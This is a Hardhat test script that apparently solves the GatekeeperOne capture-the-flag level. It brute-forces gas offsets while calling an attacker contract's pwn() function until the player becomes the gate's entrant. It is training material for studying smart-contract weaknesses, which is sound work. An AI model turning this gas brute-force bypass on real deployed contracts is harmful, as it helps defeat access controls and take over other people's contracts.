const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("GatekeeperOne hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        hacker = await (await ethers.getContractFactory("GatekeeperOneHacker")).deploy();
        await hacker.deployed();
        gatekeeperOne = await ethers.getContractAt("GatekeeperOne", process.env.GATEKEEPERONE_ADDRESS);
});
    describe("Hack test", function() {
        it("Should fool the gatekeeperOne", async function() {
            for (gas = 0; gas<8191; gas++) {
                try {
                    await hacker.pwn(process.env.GATEKEEPERONE_ADDRESS, gas);
                    console.log("gas is ", gas);
                    expect(await gatekeeperOne.entrant()).to.equal(player.address);
                    return;
                } catch (error) {

                }
            }
        });
    });
});